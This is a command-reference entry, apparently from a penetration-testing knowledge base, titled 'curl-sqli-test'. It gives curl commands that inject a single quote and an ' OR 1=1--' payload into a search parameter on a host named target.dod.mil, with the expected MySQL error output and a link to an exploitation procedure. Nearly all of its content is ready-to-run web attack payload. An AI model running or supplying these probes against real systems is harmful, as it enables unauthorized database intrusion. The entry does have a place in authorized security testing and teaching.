---
data: 'curl "https://target.dod.mil/search?q=test''" -v'
tags:
  - sqli
  - web
  - test
type: command
output: HTTP response with potential SQL error message
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:19.938Z'
id: 0b29c973-fa8f-4b4e-bfb0-a7e72de1a79d
verified: false
validated: true
submitted: true
---
# curl-sqli-test

## Command

```bash
curl "https://target.dod.mil/search?q=test'" -v
```

## Description

This command tests for SQL injection by sending a URL with a single quote in the parameter to trigger a database syntax error if input is not sanitized.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Target endpoint with injected quote | Yes |
| -v | Verbose output to see response details | No |

## Examples

### Basic Usage

```bash
curl "https://target.dod.mil/search?q=test'" -v
```

### Advanced Usage

```bash
curl -H "User-Agent: Mozilla/5.0" "https://target.dod.mil/search?q=test' OR 1=1--" -v
```

## Expected Output

A 200 OK response containing a SQL error like "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1".

## Related

- [[Related Procedure|procedures/Exploit-SQL-Injection-via-URL-Parameter]]
